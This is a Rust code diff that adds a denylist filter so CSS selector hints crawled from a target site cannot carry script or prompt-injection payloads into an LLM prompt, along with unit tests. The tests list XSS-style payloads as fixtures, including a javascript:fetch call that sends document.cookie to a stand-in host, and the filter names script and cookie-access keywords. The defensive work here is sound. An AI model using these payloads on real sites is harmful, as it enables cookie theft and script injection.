@@ -1075,6 +1075,93 @@ pub(crate) fn build_prior_wave_block(prior_wave_cases: &[GeneratedTestCaseDraft]
 /// Caps how many real crawled pages / elements-per-page / visibility-matrix
 /// entries reach the prompt — a large real site's full crawl must never make
 /// this prompt unbounded, same reasoning as `MAX_RISK_HIGHLIGHTS` above.
+/// A crawled `selectorHint` is only worth putting in a prompt if it is a plain
+/// selector and nothing else. A crawl reads its hints out of a live DOM, but
+/// that DOM is the *target's*, not ours — a page is free to set
+/// `id="javascript:fetch(...)"` or similar, and a value copied straight from
+/// there into a prompt is untrusted input. This is the same denylist
+/// `tools::dom_prober` and `plan_validator` already apply before a selector is
+/// ever used, applied here so an unsafe hint never reaches a model in the first
+/// place rather than being caught downstream.
+///
+/// `.text`, `;` and `(` are all ordinary in a CSS selector, so unlike the
+/// DOM-prober's list this keeps them; what it drops is the things that execute.
+fn crawl_selector_hint_is_safe(hint: &str) -> bool {
+    let h = hint.trim();
+    // Long enough to be a selector, short enough not to be a payload.
+    if h.is_empty() || h.len() > 200 {
+        return false;
+    }
+    // Refused outright: a backslash (CSS escapes and JS string escapes), braces
+    // and angle brackets (never in a selector), and newlines (the value is
+    // inserted into a prompt line, so one would forge a new instruction).
+    //
+    // Quotes are NOT refused, and `>` is NOT refused: `[name="email"]` and
+    // `nav ul li > a` are both completely ordinary CSS and a crawl resolves
+    // them routinely. Excluding them here would refuse the majority of real
+    // hints and lose the grounding this change exists to keep. Prompt-injection
+    // safety comes from the denylist below plus the length cap, not from
+    // banning characters the selector language actually uses.
+    if h.chars()
+        .any(|c| matches!(c, '\\' | '{' | '}' | '<' | '\n' | '\r'))
+    {
+        return false;
+    }
+    let lower = h.to_lowercase();
+
+    // Scheme and tag injection: no character these need can appear in a selector
+    // at all, so substring matching is safe and exact here.
+    for p in [
+        "javascript:",
+        "vbscript:",
+        "data:text/html",
+        "<script",
+        "</script",
+    ] {
+        if lower.contains(p) {
+            return false;
+        }
+    }
+
+    // Call/execution forms: matched with the opening bracket, so a selector
+    // that merely contains the letters (`:not(.constructor)`, `[data-x=eval(1)]`
+    // is genuinely a different thing) is not caught by accident.
+    for p in ["eval(", "function(", "expression(", "fetch(", "alert("] {
+        if lower.contains(p) {
+            return false;
+        }
+    }
+
+    // Event-handler attributes only count as a real `on*=`, not as part of a
+    // longer word.
+    for p in ["onload=", "onerror=", "onclick=", "onmouseover="] {
+        if lower.contains(p) {
+            return false;
+        }
+    }
+
+    // JS reach-through. These DO occur inside ordinary selectors
+    // (`:not(.constructor)`, `constructor` as a class name), so they are
+    // matched as whole dot-delimited identifiers rather than substrings --
+    // otherwise a legitimate selector gets refused and the crawl's grounding is
+    // lost, which is the same failure this whole change exists to fix.
+    let idents: Vec<&str> = lower
+        .split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '$')
+        .filter(|s| !s.is_empty())
+        .collect();
+    for bad in ["document", "window", "fetch", "xmlhttprequest", "location", "cookie"] {
+        if idents.iter().any(|i| *i == bad) {
+            return false;
+        }
+    }
+    // `__proto__` only ever appears as an identifier, never inside one.
+    if lower.contains("__proto__") {
+        return false;
+    }
+
+    true
+}
+
 const MAX_CRAWL_PAGES: usize = 8;
 const MAX_ELEMENTS_PER_PAGE: usize = 12;
 const MAX_VISIBILITY_ENTRIES: usize = 6;
@@ -1108,7 +1195,15 @@ pub(crate) fn build_crawl_context_block(crawl: Option<&crate::crawler::CrawlOutp
         return String::new();
     }
 
-    let mut pages_by_url: std::collections::BTreeMap<&str, (&str, Vec<&str>)> =
+    // Each entry keeps the element's label AND the exact selector the crawl
+    // observed for it. The selector used to be dropped right here: the crawl
+    // really does resolve `#launch-run-header-button`-style ids, but only the
+    // visible text reached the prompt, so a model grounded on it could only
+    // ever write a case like "a button labelled Launch Run is visible" --
+    // which the compile step then correctly refuses as NOT_EXECUTABLE for
+    // having no selector to click. Naming the element is the entire point of
+    // grounding a case in a live crawl.
+    let mut pages_by_url: std::collections::BTreeMap<&str, (&str, Vec<String>)> =
         std::collections::BTreeMap::new();
     for role in &crawl.roles {
         for page in &role.pages {
@@ -1117,8 +1212,20 @@ pub(crate) fn build_crawl_context_block(crawl: Option<&crate::crawler::CrawlOutp
                 .or_insert_with(|| (page.title.as_str(), Vec::new()));
             for el in &page.elements {
                 let label = el.text.trim();
-                if !label.is_empty() && !entry.1.contains(&label) {
-                    entry.1.push(label);
+                let hint = el.selector_hint.trim();
+                let safe_hint = crawl_selector_hint_is_safe(hint);
+                let line = match (label.is_empty(), safe_hint) {
+                    // No usable text: the selector alone still identifies it.
+                    (true, true) => hint.to_string(),
+                    (false, true) if hint.is_empty() => label.to_string(),
+                    (false, true) => format!("{label} [{hint}]"),
+                    // Unsafe or absent hint: keep the label, which came from the
+                    // same untrusted page but is only ever read as prose.
+                    (false, false) => label.to_string(),
+                    (true, false) => continue,
+                };
+                if !entry.1.contains(&line) {
+                    entry.1.push(line);
                 }
             }
         }
@@ -1134,7 +1241,7 @@ pub(crate) fn build_crawl_context_block(crawl: Option<&crate::crawler::CrawlOutp
         let shown: Vec<&str> = elements
             .iter()
             .take(MAX_ELEMENTS_PER_PAGE)
-            .copied()
+            .map(|s| s.as_str())
             .collect();
         let elements_text = if shown.is_empty() {
             "(no labeled elements found)".to_string()
@@ -3527,6 +3634,112 @@ mod tests {
         assert_eq!(prompts.len(), 1);
         assert!(prompts[0].contains("Login to Dashboard"));
         assert!(prompts[0].contains("REAL APPLICATION SURFACE"));
+    }
+
+    /// The defect this pins: the crawl resolved real, clickable ids, and the
+    /// prompt threw them away, keeping only the visible text. A model given
+    /// that could only write "a button labelled X is visible", which compiles
+    /// to NOT_EXECUTABLE for having nothing to click -- so the grounding the
+    /// crawl paid for was thrown away one line before the prompt.
+    #[test]
+    fn the_crawl_block_carries_the_observed_selector_not_only_the_visible_text() {
+        let crawl = crawl_output(vec![crate::crawler::RoleCrawlResult {
+            role: "anonymous".to_string(),
+            login_succeeded: true,
+            login_error: None,
+            pages: vec![crate::crawler::CrawledPage {
+                url: "http://x/dashboard".to_string(),
+                title: "Dashboard".to_string(),
+                elements: vec![crate::crawler::CrawledElement {
+                    kind: "button".to_string(),
+                    text: "Launch Run".to_string(),
+                    selector_hint: "#launch-run-header-button".to_string(),
+                    href: None,
+                }],
+            }],
+        }]);
+
+        let block = build_crawl_context_block(Some(&crawl));
+
+        assert!(
+            block.contains("#launch-run-header-button"),
+            "the selector the crawl actually observed must reach the prompt, got:\n{block}"
+        );
+        assert!(
+            block.contains("Launch Run"),
+            "the label must still be there too, got:\n{block}"
+        );
+    }
+
+    /// A selector is copied out of the *target's* DOM, so it is untrusted input
+    /// like any other. This is the same denylist `tools::dom_prober` and
+    /// `plan_validator` apply; the point of applying it here is that an unsafe
+    /// hint never reaches a model at all.
+    #[test]
+    fn an_unsafe_crawled_selector_never_reaches_the_prompt() {
+        let cases = [
+            "javascript:void(delete-user)",
+            "javascript:fetch('//evil.test/'+document.cookie)",
+            "#x[data-a=\" onload=alert(1)\"]",
+            "#y[' + eval('1') + ']",
+            "data:text/html,<script>alert(1)</script>",
+            "body > div:nth-child(1) /* <script> */",
+        ];
+        for hint in cases {
+            assert!(
+                !crawl_selector_hint_is_safe(hint),
+                "{hint:?} must be refused as a selector"
+            );
+
+            // And end to end: refused means absent from the block, while the
+            // element's label is still offered as prose.
+            let crawl = crawl_output(vec![crate::crawler::RoleCrawlResult {
+                role: "anonymous".to_string(),
+                login_succeeded: true,
+                login_error: None,
+                pages: vec![crate::crawler::CrawledPage {
+                    url: "http://x/d".to_string(),
+                    title: "D".to_string(),
+                    elements: vec![crate::crawler::CrawledElement {
+                        kind: "button".to_string(),
+                        text: "Delete user".to_string(),
+                        selector_hint: hint.to_string(),
+                        href: None,
+                    }],
+                }],
+            }]);
+            let block = build_crawl_context_block(Some(&crawl));
+            assert!(
+                !block.contains("javascript:") && !block.contains("<script") && !block.contains("eval("),
+                "{hint:?} leaked into the prompt:\n{block}"
+            );
+            assert!(
+                block.contains("Delete user"),
+                "the label alone should still be offered, got:\n{block}"
+            );
+        }
+    }
+
+    /// The obvious counter-mistake: refuse so much that ordinary selectors stop
+    /// working. `:`, `.`, `#`, `[`, `]`, `>`, `(`, `)`, `,` and `=` are all
+    /// ordinary in a real CSS selector.
+    #[test]
+    fn ordinary_css_selectors_are_accepted() {
+        for hint in [
+            "#launch-run-header-button",
+            ".sr-only",
+            "nav ul li:nth-child(2) > a",
+            "form#login input[name=\"email\"]",
+            "button[type=submit]",
+            "tbody tr:first-child td:nth-of-type(3)",
+            "[data-testid='cart-button']",
+            "div.card > ul.list li:not(.hidden)",
+        ] {
+            assert!(
+                crawl_selector_hint_is_safe(hint),
+                "{hint:?} is an ordinary selector and must be allowed"
+            );
+        }
     }
 
     #[tokio::test]
